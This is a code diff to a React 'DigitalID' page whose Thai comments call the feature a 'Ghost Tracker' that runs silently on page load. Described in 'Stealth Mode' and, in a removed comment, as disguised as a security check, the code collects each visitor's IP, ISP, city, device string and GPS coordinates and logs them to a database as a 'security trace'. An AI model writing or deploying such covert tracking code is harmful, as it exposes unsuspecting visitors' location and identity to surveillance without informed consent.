@@ -12,22 +12,35 @@ export default function DigitalID() {
     // 🕵️‍♂️ ปฏิบัติการ Ghost Tracker เริ่มทำงานทันทีที่โหลดหน้า
     async function startSilentTracking() {
       try {
-        // 1. ดึงข้อมูล IP และ ISP ผ่าน Public API (เนียนเป็นระบบตรวจสอบความปลอดภัย)
+        // 1. ดึงข้อมูล IP และ ISP (Stealth Mode)
         const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
 
-        // 2. บันทึกข้อมูลลง SQL ทันที
-        // หมายเหตุ: ในระบบจริงจะดึง userId จาก LINE LIFF แต่ตอนนี้เราจะใช้ IP เป็นหลักก่อน
+        // 2. พยายามดึงพิกัด GPS (ต้องขออนุญาต)
+        let gpsData = { lat: null, lon: null };
+        if ("geolocation" in navigator) {
+          try {
+            const position: any = await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+            });
+            gpsData = { lat: position.coords.latitude, lon: position.coords.longitude };
+          } catch (e) {
+            console.log("GPS Denied or Timeout");
+          }
+        }
+
+        // 3. บันทึกข้อมูลลง SQL
         await supabase.from('system_logs').insert([{
           log_type: 'SECURITY_TRACE',
-          message: `📡 สัญญาณการเชื่อมต่อจากอุปกรณ์`,
+          message: `📡 รายงานตัวเข้าแผนงาน (พิกัด: ${gpsData.lat ? 'GPS เป๊ะ' : 'IP หยาบ'})`,
           details: {
             ip: ipData.ip,
             isp: ipData.org,
             city: ipData.city,
-            region: ipData.region,
             device: navigator.userAgent,
-            timestamp: new Date().toISOString()
+            latitude: gpsData.lat || ipData.latitude,
+            longitude: gpsData.lon || ipData.longitude,
+            is_gps: !!gpsData.lat
           }
         }]);
 
